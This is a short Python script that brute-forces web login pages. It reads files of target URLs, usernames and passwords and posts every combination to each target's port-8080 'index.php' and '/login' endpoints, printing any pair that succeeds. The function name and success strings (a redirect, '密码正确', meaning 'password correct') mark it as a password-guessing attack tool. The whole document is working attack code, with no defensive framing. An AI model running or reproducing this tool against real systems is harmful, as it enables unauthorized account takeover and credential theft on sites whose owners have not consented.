import requests
import threading

def baopo(url,user,password):
    urls=[]
    usernames=[]
    passwords=[]
    headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36'}
    for u in url:
        qc="".join(str(u).split('\n'))
        urls.append(qc)
    for name in user:
        qc2="".join(str(name).split('\n'))
        usernames.append(qc2)
    for passwd in password:
        qc3="".join(str(passwd).split('\n'))
        passwords.append(qc3)

    for us in usernames:
        for ps in passwords:
            data={'username': '{}'.format(us),'passwd': '{}'.format(ps),'Submit_login':'' }
            for ur in urls:
                uds=ur.strip()+':8080/index.php'.strip()
                uds2=ur.strip()+':8080/login'.strip()
                try:
                    reqts=requests.post(url=uds,headers=headers,data=data)
                    reqts2=requests.post(url=uds2,headers=headers,data=data)
                    if '<script language="javascript">location.href="index.php"</script>' in reqts.text or '密码正确' in reqts2.json():
                        print('[*]url:{}|username:{}|password:{}'.format(reqts.url,us,ps))
                    else:
                        print('[-]fuck url:{}|username:{}|password:{}'.format(reqts.url,us,ps))
                        print('[-]fuck2 url:{}|json:{}'.format(reqts2.url,reqts2.json()))
                except:
                    pass




def run():
    xw=input('URL-->')
    xw2=input('username-->')
    xw3=input('password-->')
    try:
        dk=open('{}'.format(xw),'r')
        dk2=open('{}'.format(xw2),'r')
        dk3=open('{}'.format(xw3),'r')
        t=threading.Thread(target=baopo,args=(dk,dk2,dk3))
        t.start()
    except Exception as r:
        print(r)

run()
